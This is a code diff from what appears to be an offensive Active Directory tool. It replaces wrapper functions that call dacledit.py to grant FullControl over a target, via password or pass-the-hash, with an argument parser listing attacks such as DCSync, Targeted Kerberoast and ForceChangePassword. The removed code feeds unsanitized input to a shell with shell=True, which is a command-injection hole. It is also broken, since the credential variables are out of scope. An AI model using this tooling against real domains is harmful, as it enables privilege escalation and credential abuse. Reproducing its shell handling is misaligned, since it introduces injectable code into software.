@@ -1,47 +1,46 @@
-import os
-import subprocess
-from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py
+#!/usr/bin/env python3
 
-# Install missing dependencies if necessary
-try:
-    from colorama import Fore
-except ImportError:
-    os.system("sudo pip install colorama")
+import argparse
+import sys
 
-# Set colorama color constants
-RED = Fore.RED
-YELLOW = Fore.YELLOW
-GREEN = Fore.GREEN
-MAGENTA = Fore.MAGENTA
-BLUE = Fore.BLUE
-CYAN = Fore.CYAN
-RESET = Fore.RESET
-
-def GenericAllHash():
-    tar = input(f"{CYAN}Target:{RED} ")
-    subprocess.call([f"{RESET}"], shell=True)
-    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
+def parse_arguments():
+    # Argument parsing for different options
+    parser = argparse.ArgumentParser(description="DACL Tool", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
     
-def GenericAllPass():
-    tar = input(f"{CYAN}Target:{RED} ")
-    subprocess.call([f"{RESET}"], shell=True)
-    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)
+    # Define all the possible actions
+    parser.add_argument("-T", "--TargetedKerberoast", action="store_true", help="Targeted Kerberoasting")
+    parser.add_argument("-A", "--AddMembers", action="store_true", help="Add Members")
+    parser.add_argument("-P", "--PasswordAbuse", action="store_true", help="Password Abuse")
+    parser.add_argument("-W", "--WriteDacl", action="store_true", help="Write DACL")
+    parser.add_argument("-F", "--ForceChangePassword", action="store_true", help="Force Change Password")
+    parser.add_argument("-G", "--GenericAll", action="store_true", help="Generic All Attack")
+    parser.add_argument("-D", "--DCSync", action="store_true", help="DCSync Attack")
+    parser.add_argument("-O", "--WriteOwner", action="store_true", help="Write Owner")
+    parser.add_argument("-d", "--DomainName", action="store", help="Domain Name", required=True)
+    
+    # Modify these lines to make username and password optional when -E is used
+    parser.add_argument("-u", "--Username", action="store", help="Username")
+    parser.add_argument("-p", "--Password", action="store", help="Password")
+    
+    parser.add_argument("-H", "--PassTheHash", action="store", help="Hash")
+    parser.add_argument("-E", "--Enumerate", action="store_true", help="Enumerate the Target System with NetExec")
+    
+    args = parser.parse_args()  # Parse the arguments
+    
+    # If no arguments are passed or critical arguments are missing, show help
+    if not any(vars(args).values()):  # Check if no arguments were provided
+        parser.print_help()
+        sys.exit(1)  # Exit the program after showing help
+    
+    # If not in enumerate mode, username and password are required
+    if not args.Enumerate:
+        if not args.Username or not args.Password:
+            parser.print_help()
+            sys.exit(1)  # Exit after showing the help if required arguments are missing
+    
+    return args  # Return the parsed arguments
 
-def main():
-    # Get the arguments from the argument_parser.py
-    args = parse_arguments()
-
-    # Extract arguments
-    DOMAIN = args.DomainName
-    USER = args.Username
-    PASS = args.Password
-    HASH = args.PassTheHash  
-
-    # Execute the appropriate function based on the parsed arguments
-    if HASH:
-        GenericAllHash()  
-    else:
-        GenericAllPass()  
-
+# If you want to use this file standalone for debugging or testing
 if __name__ == '__main__':
-    main()
+    args = parse_arguments()
+    print(args)
